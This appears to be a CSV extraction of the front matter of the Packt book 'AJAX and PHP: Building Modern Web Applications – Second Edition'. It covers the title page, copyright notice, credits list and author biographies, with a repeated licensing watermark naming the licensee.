Larger Text,Smaller Text,Symbol
AJAX and PHP,NA,NA
Building Modern Web Applications – Second ,NA,NA
Edition,NA,NA
Build user-friendly Web 2.0 Applications with JavaScript ,NA,NA
and PHP,NA,NA
Bogdan Brinzarea-Iamandi ,NA,NA
Cristian Darie ,NA,NA
Audra Hendrix,"BIRMINGHAM - MUMBAI
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
AJAX and PHP ,"Building Modern Web Applications – Second Edition
  
 Copyright © 2009 Packt Publishing
  
 All rights reserved. No part of this book may be reproduced, stored in a retrieval 
 system, or transmitted in any form or by any means, without the prior written 
 permission of the publisher, except in the case of brief quotations embedded in 
 critical articles or reviews.
  
 Every effort has been made in the preparation of this book to ensure the accuracy of 
 the information presented. However, the information contained in this book is sold 
 without warranty, either express or implied. Neither the authors, nor Packt 
 Publishing, and its dealers and distributors will be held liable for any damages caused 
 or alleged to be caused directly or indirectly by this book.
  
 Packt Publishing has endeavored to provide trademark information about all of the 
 companies and products mentioned in this book by the appropriate use of capitals. 
  
 However, Packt Publishing cannot guarantee the accuracy of this information.
  
 First published: December 2009
  
 Production Reference: 1101209
  
 Published by Packt Publishing Ltd. 
  
 32 Lincoln Road 
  
 Olton 
  
 Birmingham, B27 6PA, UK.
  
 ISBN 978-1-847197-72-6
  
 www.packtpub.com
  
 Cover Image by Parag Kadam (
 paragvkadam@gmail.com
 )
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Credits,"Authors 
  
 Bogdan Brinzarea-Iamandi
  
 Cristian Darie 
  
 Audra Hendrix
  
 Reviewer 
  
 Kalpesh Barot
  
 Acquisition Editor 
 Douglas Paterson
  
 Development Editor 
 Dhiraj Chandiramani
  
 Technical Editor 
  
 Aanchal Kumar
  
 Indexer 
  
 Rekha Nair
  
 Editorial Team Leader 
 Gagandeep Singh
  
 Project Team Leader 
 Lata Basantani
  
 Project Coordinators 
 Srimoyee Ghoshal
  
 Rajashree Hamine
  
 Proofreader 
  
 Sandra Hopper
  
 Graphics 
  
 Nilesh Mohite
  
 Production Coordinators 
 Adline Swetha Jesuthas
  
 Dolly Dasilva
  
 Cover Work 
  
 Dolly Dasilva
  
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
About the Authors,"Bogdan Brinzarea-Iamandi
  is a software engineer having a strong background in 
 Computer Science. He holds a Master and Bachelor Degree from the Automatic Control 
 and Computers Faculty at the Politehnica University of Bucharest, Romania. 
  
 He also has an Auditor diploma from the Computer Science department at Ecole 
 Polytechnique, Paris, France.
  
 His main interests include software architecture, web technologies, distributed 
 computing, and software methodologies. Currently, he is the Software Development 
 Manager at a Romanian bank, Banca Romaneasca, a member of the National Bank of 
 Greece, where he coordinates the development and implementation of enterprise 
 software for the banking industry.
  
 He is also the author of the books 
 AJAX and PHP: Building Responsive Web Applications 
 and
  Microsoft AJAX Library Essentials: Client-side ASP.NET AJAX 1.0 Explained.
  
 Cristian Darie
  is a software engineer with experience in a wide range of modern 
 technologies, and is the author of numerous books, which are all listed on his 
 homepage at 
 http://www.cristiandarie.ro
 . Cristian is the manager and the 
 former technical architect of 
 http://www.okazii.ro
 , the largest Romanian e-
 commerce website.
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
